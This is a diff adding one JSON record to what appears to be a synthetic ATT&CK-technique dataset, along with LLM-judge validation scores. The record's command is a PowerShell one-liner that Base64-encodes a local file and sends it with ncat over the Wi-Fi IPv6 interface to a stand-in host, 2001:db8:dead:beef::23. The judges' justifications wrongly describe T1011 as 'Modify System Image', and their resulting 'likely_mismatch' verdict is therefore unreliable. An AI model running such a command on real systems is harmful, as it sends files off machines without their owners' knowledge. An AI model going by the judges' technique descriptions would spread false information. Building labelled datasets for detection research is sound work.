@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$src=(Get-NetIPAddress -InterfaceAlias 'Wi-Fi' -AddressFamily IPv6 | ?{$_.AddressState -eq 'Preferred'} | Select-Object -First 1 -ExpandProperty IPAddress); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -s $src 2001:db8:dead:beef::23 47017 --send-only",
+  "explanation": "Binds the exfiltration flow to the Wi-Fi IPv6 address (distinct network path) and sends Base64 data via ncat to a high, uncommon TCP port. This explicitly uses a different medium/interface than a likely primary wired channel, aligning with T1011.",
+  "rationale_steps": [
+    "Select Wi-Fi IPv6 address to force use of a different network medium/interface.",
+    "Send Base64 data via IPv6 TCP to a non-standard high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-563bdea1",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses, correct variable assignments, proper piping, and valid ncat parameters.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over a network channel, it doesn't align with T1011 (Exfiltration Over Other Network Medium) as it doesn't modify system images or firmware as described in the technique description.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T18:44:01.430312Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced syntax, valid PowerShell cmdlets, .NET methods, and correct ncat arguments for its intended network operation.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs file exfiltration over a specific network interface, an action completely unrelated to the T1011 'Modify System Image' technique, which involves altering OS/firmware images for persistence or backdoors.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T18:44:12.416330Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "PowerShell variables, piping, and quoting are correct with valid ncat flags, though placing --send-only after the host/port is nonstandard and may cause parsing issues in some builds.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration over IPv6 via a Wi\u2011Fi interface using ncat, which does not relate to modifying a system/firmware image as described for the technique.",
+        "combined_score": 2.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T18:45:18.307219Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
